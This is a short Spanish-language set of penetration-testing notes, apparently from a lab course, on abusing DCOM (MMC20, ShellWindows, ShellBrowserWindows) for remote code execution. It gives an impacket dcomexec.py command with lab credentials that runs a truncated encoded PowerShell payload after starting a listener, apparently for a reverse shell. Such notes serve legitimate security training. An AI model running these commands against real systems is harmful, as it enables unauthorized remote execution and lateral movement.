# Requisitos

- Un usuario con permisos específicos (local and network access)
- Usuarios miembros del grupo "Distributed COM Users"
- Usuarios miembros de "Administrators group"


# Tecnicas

Existen muchas técnicas utilizadas para abusar de este protocolo. las más importantes son **MMC20**, **ShellWindows** y **ShellBrowserWindows**
# Desde linux

### dcomexec.py

Parte del paquete impacket.

##### Obtener RCE

###### 1) iniciamos un listener
###### 2) Corremos dcomexec

    python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias:Jonny25@172.20.0.52 "powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -silentcommand

Podemos usar cualquiera de las 3 técnicas mediante dcomexec cambiando simplemente el nombre de la misma.
